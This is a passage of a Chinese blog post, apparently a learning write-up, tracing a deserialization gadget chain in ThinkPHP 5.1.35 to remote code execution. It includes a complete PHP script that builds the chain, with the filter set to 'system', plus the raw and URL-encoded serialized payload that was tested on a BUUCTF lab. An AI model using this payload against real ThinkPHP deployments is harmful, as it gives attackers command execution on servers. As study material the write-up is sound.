    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">''</span> <span class="token operator">!=</span> <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 解析name</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$type</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

      <span class="token operator">**</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">**</span>
	<span class="token operator">...</span><span class="token operator">...</span>

    <span class="token comment">// 解析过滤器</span>
  <span class="token operator">**</span><span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getFilter</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span> <span class="token variable">$default</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">**</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">array_walk_recursive</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'filterValue'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">version_compare</span><span class="token punctuation">(</span><span class="token constant">PHP_VERSION</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'7.1.0'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">arrayReset</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> 
    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">filterValue</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token operator">...</span><span class="token operator">...</span>
    <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>为了控制<code>input()</code>的参数，因为这些参数都是形式参数，我们先看看谁调用了<code>input()</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">param</span><span class="token punctuation">(</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$default</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">,</span> <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mergeParam</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$method</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">method</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">...</span><span class="token operator">...</span>
        <span class="token comment">// 当前请求参数和URL地址中的参数合并</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">param</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">param</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$vars</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">route</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//get()函数</span>
        <span class="token operator">...</span><span class="token operator">.</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">true</span> <span class="token operator">===</span> <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
           <span class="token operator">...</span><span class="token operator">...</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">input</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">param</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$default</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里的参数仍然不可控，看看谁调用了<code>param()</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Request</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token comment">// 表单请求类型伪装变量</span>
        <span class="token string single-quoted-string">'var_method'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'_method'</span><span class="token punctuation">,</span>
        <span class="token comment">// 表单ajax伪装变量</span>
        <span class="token string single-quoted-string">'var_ajax'</span>         <span class="token operator">=></span> <span class="token string single-quoted-string">'_ajax'</span><span class="token punctuation">,</span>
   	<span class="token operator">...</span><span class="token operator">...</span>
    <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token operator">...</span><span class="token operator">...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20220104154940587.png" loading="lazy"></p>
<p><strong>可以看到<code>param()</code>的参数是可控制的，就是数组<code>$config</code>中的<code>var_ajax</code></strong></p>
<p><strong><code>isAjax()</code>的<code>$config</code>可控</strong>，<strong>说明<code>param()</code>的<code>$name</code>可控</strong>，</p>
<p><code>param()</code>的<code>$name</code>可控,<strong>说明<code>input()</code>的<code>$name</code>可控，而<code>$data</code>就是<code>param</code>中的<code>$this-&gt;param</code>，是通过<code>$_GET</code>赋值的</strong></p>
<p>回到<code>input()</code>，<code>$data = $this-&gt;getData($data, $name);</code>跟进<code>getData()</code></p>
<p><img src="/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20220104161422332.png" alt="image-20220104161422332" loading="lazy"></p>
<p><code>$data</code>就是<code>$data[$val]</code>，就是<code>$_GET</code>传入的值</p>
<p>继续往下看，<code>$filter = $this-&gt;getFilter($filter, $default);</code>,跟进<code>getFilter()</code></p>
<p><img src="/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20220104162224855.png" alt="image-20220104162224855" loading="lazy"></p>
<p><strong>这里的<code>$fileter</code>来自于<code>$this-&gt;filter</code></strong></p>
<p>继续往下看，这是一个回调函数,<code>[$this,&#39;filterValue&#39;]</code>是调用该类中的<code>filterValue()</code>函数</p>
<p>第一个参数<code>$data</code>为数组，是由<code>$_GET</code>传入的</p>
<p>数组的键作为函数的第二个参数，数组的值作为函数的第一个参数，<code>$filter</code>就是第三个参数</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">...</span><span class="token operator">...</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">array_walk_recursive</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'filterValue'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">...</span><span class="token operator">...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">filterValue</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$filters</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$default</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$filters</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$filters</span> <span class="token keyword">as</span> <span class="token variable">$filter</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_callable</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 调用函数或者方法过滤</span>
            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">is_scalar</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">!==</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token comment">// 正则过滤</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token comment">// 匹配不成功返回默认值</span>
                    <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$default</span><span class="token punctuation">;</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
  			<span class="token operator">...</span><span class="token operator">...</span>

    <span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong><code>$value = call_user_func($filter, $value);</code></strong></p>
<p><code>$filter</code>是可控的，<code>$value</code>也是可控的（<code>$_GET传入</code>，是传入的值），这样就能执行我们想要执行的函数</p>
<p>这样，所有的参数都可控了，捋一下思路：</p>
<p>1、Windows.php的类Windows</p>
<p>2、Model.php的抽象类Model，所以要找一个类继承Model,Pivot.php的类Pivot</p>
<p><img src="/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20220104165344615.png" alt="image-20220104165344615" loading="lazy"></p>
<p>3、Request.php的类Request</p>
<p>尝试构造<code>playload</code>:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span>

<span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span><span class="token punctuation">&#123;</span><span class="token comment">//Attribute 和 Conversion</span>
    <span class="token keyword">protected</span> <span class="token variable">$append</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">append</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ethan'</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token string single-quoted-string">'calc.exe'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'calc'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ethan'</span><span class="token operator">=></span><span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//进入Request()的__call()</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//namespace think; 相同的命名空间，可以省略</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Request</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$hook</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$filter</span><span class="token operator">=</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token comment">// 表单请求类型伪装变量</span>
        <span class="token string single-quoted-string">'var_method'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'_method'</span><span class="token punctuation">,</span>
        <span class="token comment">// 表单ajax伪装变量</span>
        <span class="token string single-quoted-string">'var_ajax'</span>         <span class="token operator">=></span> <span class="token string single-quoted-string">'_ajax'</span><span class="token punctuation">,</span>
        <span class="token comment">// 表单pjax伪装变量</span>
        <span class="token string single-quoted-string">'var_pjax'</span>         <span class="token operator">=></span> <span class="token string single-quoted-string">'_pjax'</span><span class="token punctuation">,</span>
        <span class="token comment">// PATHINFO变量名 用于兼容模式</span>
        <span class="token string single-quoted-string">'var_pathinfo'</span>     <span class="token operator">=></span> <span class="token string single-quoted-string">'s'</span><span class="token punctuation">,</span>
        <span class="token comment">// 兼容PATH_INFO获取</span>
        <span class="token string single-quoted-string">'pathinfo_fetch'</span>   <span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'ORIG_PATH_INFO'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'REDIRECT_PATH_INFO'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'REDIRECT_URL'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token comment">// 默认全局过滤方法 用逗号分隔多个</span>
        <span class="token string single-quoted-string">'default_filter'</span>   <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token comment">// 域名根，如thinkphp.cn</span>
        <span class="token string single-quoted-string">'url_domain_root'</span>  <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token comment">// HTTPS代理标识</span>
        <span class="token string single-quoted-string">'https_agent_name'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token comment">// IP代理获取标识</span>
        <span class="token string single-quoted-string">'http_agent_ip'</span>    <span class="token operator">=></span> <span class="token string single-quoted-string">'HTTP_X_REAL_IP'</span><span class="token punctuation">,</span>
        <span class="token comment">// URL伪静态后缀</span>
        <span class="token string single-quoted-string">'url_html_suffix'</span>  <span class="token operator">=></span> <span class="token string single-quoted-string">'html'</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span><span class="token punctuation">;</span>
    
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var_ajax'</span><span class="token operator">=></span><span class="token string single-quoted-string">''</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//为空就能满足param的条件</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hook</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'visible'</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'isAjax'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//__call中调用自身类中的方法isAjax</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filter</span><span class="token operator">=</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>  <span class="token comment">//可控</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
    
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span> <span class="token comment">//程序入口</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>concern<span class="token punctuation">\</span>Conversion</span><span class="token punctuation">;</span> <span class="token comment">//Conversion所处的命名空间，用到了类中的__toString方法</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span>  <span class="token comment">//继承了抽象类 Model,要不然Model用不了</span>
    
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Windows</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//这样程序入口就和其他类链接上了</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span> <span class="token comment">//类Pivot,必须有，要不然无法序列化</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span>
<span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span>  <span class="token comment">//最后包含程序入口的命名空间，序列化Windows</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>反序列化字符串为：</p>
<pre class="line-numbers language-none"><code class="language-none">O:27:&quot;think\process\pipes\Windows&quot;:1:&#123;s:34:&quot;think\process\pipes\Windowsfiles&quot;;a:1:&#123;i:0;O:17:&quot;think\model\Pivot&quot;:2:&#123;s:9:&quot;*append&quot;;a:1:&#123;s:5:&quot;ethan&quot;;a:2:&#123;i:0;s:8:&quot;calc.exe&quot;;i:1;s:4:&quot;calc&quot;;&#125;&#125;s:17:&quot;think\Modeldata&quot;;a:1:&#123;s:5:&quot;ethan&quot;;O:13:&quot;think\Request&quot;:3:&#123;s:7:&quot;*hook&quot;;a:1:&#123;s:7:&quot;visible&quot;;a:2:&#123;i:0;r:9;i:1;s:6:&quot;isAjax&quot;;&#125;&#125;s:9:&quot;*filter&quot;;s:6:&quot;system&quot;;s:9:&quot;*config&quot;;a:1:&#123;s:8:&quot;var_ajax&quot;;s:0:&quot;&quot;;&#125;&#125;&#125;&#125;&#125;&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>url编码后的反序列化字符串为：</p>
<pre class="line-numbers language-none"><code class="language-none">O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A5%3A%22ethan%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A8%3A%22calc.exe%22%3Bi%3A1%3Bs%3A4%3A%22calc%22%3B%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A5%3A%22ethan%22%3BO%3A13%3A%22think%5CRequest%22%3A3%3A%7Bs%3A7%3A%22%00%2A%00hook%22%3Ba%3A1%3A%7Bs%3A7%3A%22visible%22%3Ba%3A2%3A%7Bi%3A0%3Br%3A9%3Bi%3A1%3Bs%3A6%3A%22isAjax%22%3B%7D%7Ds%3A9%3A%22%00%2A%00filter%22%3Bs%3A6%3A%22system%22%3Bs%3A9%3A%22%00%2A%00config%22%3Ba%3A1%3A%7Bs%3A8%3A%22var_ajax%22%3Bs%3A0%3A%22%22%3B%7D%7D%7D%7D%7D%7D <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后直接在BUUCTF上开个靶场，传入反序列化字符串</p>
<p><img src="/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20220104220546845.png" alt="image-20220104220546845" loading="lazy"></p>
<p><img src="/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20220104222416716.png" alt="image-20220104222416716" loading="lazy"></p>
<p><img src="/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/image-20220104222427131.png" alt="image-20220104222427131" loading="lazy"></p>
<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>而在实战中，若是存在这种反序列化的点，就有可能会造成RCE</p>
<p>这次学习，算是第一次接触这么复杂的东西，也是第一次反序列化利用链挖掘，收获了许多东西，希望自己能越来越强！加油！</p>
</div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Siii0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://siii0.github.io/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/" title="PHP学习-Thinkphp 5.1.35反序列化pop链挖掘">http://siii0.github.io/PHP%E5%AD%A6%E4%B9%A0-Thinkphp5.1.35%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%8C%96%E6%8E%98/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> 许可协议。</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/CTF%E4%B9%8BFlask%E6%A1%86%E6%9E%B6%E7%AE%80%E8%A6%81%E4%BA%86%E8%A7%A3/" rel="prev" title="CTF之Flask框架简要了解"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">CTF之Flask框架简要了解</span></a></div><div class="post-nav-item"></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>要不要和我说些什么？</span><br></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; Wed Jan 05 2022 08:00:00 GMT+0800 (中国标准时间) – 2022 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> Siii0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v6.0.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.7.0</span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></div></body></html>